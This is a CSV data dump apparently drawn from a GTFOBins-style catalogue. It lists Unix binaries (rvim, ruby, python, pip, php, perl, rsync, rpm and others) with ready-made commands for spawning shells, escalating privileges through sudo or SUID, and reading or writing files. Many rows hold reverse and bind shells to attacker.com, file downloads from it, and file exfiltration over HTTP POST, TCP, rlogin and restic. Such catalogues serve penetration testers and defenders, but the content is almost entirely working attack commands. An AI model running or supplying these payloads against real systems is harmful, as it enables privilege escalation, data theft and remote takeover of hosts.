"sash","","","sash","","","sudo sash","","","","","./sash","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rvim","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rvim` is compiled with Lua support.'']","[''rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''rvim -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rvim` is compiled with Lua support.'']","[''sudo rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo rvim -c ':lua os.execute(""reset; exec sh"")''']","","","rvim file_to_read","","./rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","rvim file_to_write iDATA ^[ w","","./rvim -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save rvim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save rvim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 rvim -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send rvim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 rvim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send rvim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 rvim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.","rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.","./rvim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `rvim` is compiled with Lua support.","","","","false"
"rview","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rview` is compiled with Lua support.'']","[''rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''rview -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rview` is compiled with Lua support.'']","[''sudo rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo rview -c ':lua os.execute(""reset; exec sh"")''']","","","rview file_to_read","","./rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","rview file_to_write iDATA ^[ w!","","./rview -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save rview -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save rview -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 rview -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send rview -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 rview -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send rview -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 rview -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 rview -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.","rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.","./rview -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `rview` is compiled with Lua support.","","","","false"
"runscript","","","TF=$(mktemp) echo '! exec /bin/sh' >$TF runscript $TF","","","TF=$(mktemp) echo '! exec /bin/sh' >$TF sudo runscript $TF","","","","","","","","","TF=$(mktemp) echo '! exec /bin/sh' >$TF ./runscript $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"run-parts","","","run-parts --new-session --regex '^sh$' /bin","","","sudo run-parts --new-session --regex '^sh$' /bin","","","","","./run-parts --new-session --regex '^sh$' /bin --arg='-p'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"run-mailcap","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","run-mailcap --action=view /etc/hosts !/bin/sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo run-mailcap --action=view /etc/hosts !/bin/sh","","","run-mailcap --action=view file_to_read","","","","run-mailcap --action=edit file_to_read","","","","","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","","","","","","","","","","","The file must exist and be not empty.  This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.","","","","","","","","","","","","","","","","","false"
"ruby","","","ruby -e 'exec ""/bin/sh""'","","","sudo ruby -e 'exec ""/bin/sh""'","","","ruby -e 'puts File.read(""file_to_read"")'","","","","ruby -e 'File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'","","","","","","","","","","Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.","export LPORT=8888 ruby -run -e httpd . -p $LPORT","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","","","","","","ruby -e 'require ""fiddle""; Fiddle.dlopen(""lib.so"")'","","","./ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'","","","","","false"
"rtorrent","","","echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc rtorrent","","","","","","","","echo ""execute = /bin/sh,-p,-c,\""/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc ./rtorrent","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rsync","","","rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","","","sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","","","","","./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpmverify","","","rpmverify --eval '%(/bin/sh 1>&2)'","","","sudo rpmverify --eval '%(/bin/sh 1>&2)'","","","","","","","","","./rpmverify --eval '%(/bin/sh 1>&2)'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpmquery","","","rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","","","sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","","","","","","","","","./rpmquery --eval '%{lua:os.execute(""/bin/sh"")}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpmdb","","","rpmdb --eval '%(/bin/sh 1>&2)'","","","sudo rpmdb --eval '%(/bin/sh 1>&2)'","","","","","","","","","./rpmdb --eval '%(/bin/sh 1>&2)'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpm","","","[''rpm --eval '%{lua:os.execute(""/bin/sh"")}'''-|-''rpm --pipe '/bin/sh 0<&1''']","","It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF ```","[''sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'''-|-''sudo rpm -ivh x-1.0-1.noarch.rpm'']","","","","","","","","","./rpm --eval '%{lua:os.execute(""/bin/sh"")}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rlwrap","","","rlwrap /bin/sh","","","sudo rlwrap /bin/sh","","","","","./rlwrap -H /dev/null /bin/sh -p","","LFILE=file_to_write rlwrap -l ""$LFILE"" echo DATA","","","","","","","","","","","","","","","","","This adds timestamps to the output file. This relies on the external `echo` command.","","","","","","","","","","","","","","","","","false"
"rlogin","","","","","","","Usually `rlogin` is a symlink to `ssh`, the following works only when the *real* `rlogin` is used (e.g., from the `rsh-client` APT package).","","","","","","","","","","","","","","","","","","","","","Send contents of a file to a TCP port. Run `nc -l -p 12345 > ""file_to_save""` on the attacker system to capture the contents.  `rlogin` hangs waiting for the remote peer to close the socket.  The file is corrupted by leading and trailing spurious data.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send rlogin -l ""$(cat $LFILE)"" -p $RPORT $RHOST","","","","","","","","","","","","","","","","","","false"
"rev","","","","","","LFILE=file_to_read sudo rev $LFILE | rev","","","LFILE=file_to_read rev $LFILE | rev","","LFILE=file_to_read ./rev $LFILE | rev","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"restic","","","","","","RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:  ```console RPORT=12345 NAME=backup_name ./rest-server --listen "":$RPORT"" restic init -r ""rest:http://localhost:$RPORT/$NAME"" ```  To extract the data from the restic repository in the current directory on the attacker side:  ```console restic restore -r ""/tmp/restic/$NAME"" latest --target . ```  Upload data to the attacker server with the following commands.","","","","RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name ./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","","","","","","","","","","","","","","","","","","RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","","","","","","","","","","","","","","","","","","false"
"redis","","","","","","","This works with versions lower than 7.","","","","","","IP=127.0.0.1 redis-cli -h $IP config set dir dir_to_write_to config set dbfilename file_to_write set x ""DATA"" save","","","","","","","","","","","","","","","","","Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.","","","","","","","","","","","","","","","","","false"
"redcarpet","","","","","","LFILE=file_to_read sudo redcarpet ""$LFILE""","The file is actually parsed as a Markdown file.","","LFILE=file_to_read redcarpet ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"red","","","","","","sudo red file_to_write a DATA . w q","Read and write files limited to the current directory.","","red file_to_read ,p q","","","","red file_to_write a DATA . w q","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"readelf","","","","","","LFILE=file_to_read sudo readelf -a @$LFILE","Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.","","LFILE=file_to_read readelf -a @$LFILE","","LFILE=file_to_read ./readelf -a @$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rc","","","rc -c '/bin/sh'","","","sudo rc -c '/bin/sh'","","","","","./rc -c '/bin/sh -p'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rake","","","rake -p '`/bin/sh 1>&0`'","","","sudo rake -p '`/bin/sh 1>&0`'","","","LFILE=file-to-read rake -f $LFILE","","","","","","./rake -p '`/bin/sh 1>&0`'","","","","The file is actually parsed and the first wrong line is returned in an error message.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"python","","","python -c 'import os; os.system(""/bin/sh"")'","","","sudo python -c 'import os; os.system(""/bin/sh"")'","The payloads are compatible with both Python version 2 and 3.","","python -c 'print(open(""file_to_read"").read())'","","./python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","","python -c 'open(""file_to_write"",""w+"").write(""DATA"")'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])'","","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' ''-|-''export LPORT=8888 python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' '']","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 python -c 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")'","","","","","","python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","","","./python -c 'import os; os.setuid(0); os.system(""/bin/sh"")'","","","","","false"
"pwsh","","","pwsh","","","sudo pwsh","","","","","","","export LFILE=file_to_write pwsh -c '""DATA"" | Out-File $env:LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"puppet","","","puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""","","","sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""","","","LFILE=file_to_read puppet filebucket -l diff /dev/null $LFILE","","","","LFILE=""/tmp/file_to_write"" puppet apply -e ""file { '$LFILE': content => 'DATA' }""","","","","","","The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.","","","","","","","","","","","The file path must be absolute.","","","","","","","","","","","","","","","","","false"
"ptx","","","","","","LFILE=file_to_read sudo ptx -w 5000 ""$LFILE""","While the program is capable of reading the file, it outputs a ""permuted index"" of its content, thus altering it. Adjusting the options could yield more readable outputs.","","LFILE=file_to_read ptx -w 5000 ""$LFILE""","","LFILE=file_to_read ./ptx -w 5000 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"psql","","","psql \? !/bin/sh","","","psql \? !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"psftp","","","psftp !/bin/sh","","","sudo psftp !/bin/sh","","","","","","","","","sudo psftp !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pry","","","pry system(""/bin/sh"")","","","sudo pry system(""/bin/sh"")","","","","","","","","","./pry system(""/bin/sh"")","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pr","","","","","","LFILE=file_to_read pr -T $LFILE","Some bytes are altered so it might not be suitable for binary files.","","LFILE=file_to_read pr -T $LFILE","","LFILE=file_to_read pr -T $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"posh","","","posh","","","sudo posh","","","","","","","","","./posh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pkg","","","","","It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF ```","sudo pkg install -y --no-repo-update ./x-1.0.txz","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pkexec","","","","","","sudo pkexec /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pip","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py pip install $TF","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo pip install $TF","","","TF=$(mktemp -d) echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py pip install $TF","","","","export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py pip install $TF","","","","Fetch a remote file via HTTP GET request. It needs an absolute local file path.","export URL=http://attacker.com/file_to_get export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py pip install $TF","The read file content is corrupted as wrapped within an exception error.","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py pip install $TF ''-|-''export LPORT=8888 TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py pip install $TF '']","It needs an absolute local file path.","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 TF=$(mktemp -d) echo 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")' > $TF/setup.py pip install $TF","","","","","","TF=$(mktemp -d) echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py pip install $TF","","","","","","","","false"
"pidstat","","","","","","COMMAND=id sudo pidstat -e $COMMAND","","","","","COMMAND=id ./pidstat -e $COMMAND","","","","","","","","","","","","","","","COMMAND=id pidstat -e $COMMAND","","","","","","","","","","","","","","","","","","","","","false"
"pico","","The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.","[''pico ^R^X reset; sh 1>&0 2>&0 ''-|-''pico -s /bin/sh /bin/sh ^T '']","","","sudo pico ^R^X reset; sh 1>&0 2>&0","","","pico file_to_read","","","","pico file_to_write DATA ^O","","./pico -s /bin/sh /bin/sh ^T","","","","","","","","","","","","","","","","","","","","","","","","","","","","The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.","","","","false"
"pic","","","pic -U .PS sh X sh X","","","sudo pic -U .PS sh X sh X","","","LFILE=file_to_read pic $LFILE","","","","","","./pic -U .PS sh X sh X","","","","The output is prefixed with a some content as a header.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"php","","","[''export CMD=""/bin/sh"" php -r 'system(getenv(""CMD""));' ''-|-''export CMD=""/bin/sh"" php -r 'passthru(getenv(""CMD""));' ''-|-''export CMD=""/bin/sh"" php -r 'print(shell_exec(getenv(""CMD"")));' ''-|-''export CMD=""/bin/sh"" php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));' ''-|-''export CMD=""/bin/sh"" php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }' '']","","","CMD=""/bin/sh"" sudo php -r ""system('$CMD');""","","","export LFILE=file_to_read php -r 'readfile(getenv(""LFILE""));'","","CMD=""/bin/sh"" ./php -r ""pcntl_exec('/bin/sh', ['-p']);""","","export LFILE=file_to_write php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'","","","","","","","","export CMD=""id"" php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'","","Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.","LHOST=0.0.0.0 LPORT=8888 php -S $LHOST:$LPORT","write data to a file, filename should be absolute.","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&3 >&3 2>&3"");'","","","","","","","","","CMD=""/bin/sh"" ./php -r ""posix_setuid(0); system('$CMD');""","","","","","false"
"pg","","","pg /etc/profile !/bin/sh","","","sudo pg /etc/profile !/bin/sh","","","pg file_to_read","","./pg file_to_read","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pexec","","","pexec /bin/sh","","","sudo pexec /bin/sh","","","","","./pexec /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"perlbug","","","perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'","","","sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"perl","","","perl -e 'exec ""/bin/sh"";'","","","sudo perl -e 'exec ""/bin/sh"";'","","","LFILE=file_to_read perl -ne print $LFILE","","./perl -e 'exec ""/bin/sh"";'","","","","","","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","","","","","","","","","./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'","","","","","false"
"perf","","","perf stat /bin/sh","","","sudo perf stat /bin/sh","","","","","./perf stat /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pdftex","","","pdftex --shell-escape '\write18{/bin/sh}\end'","","","sudo pdftex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","./pdftex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
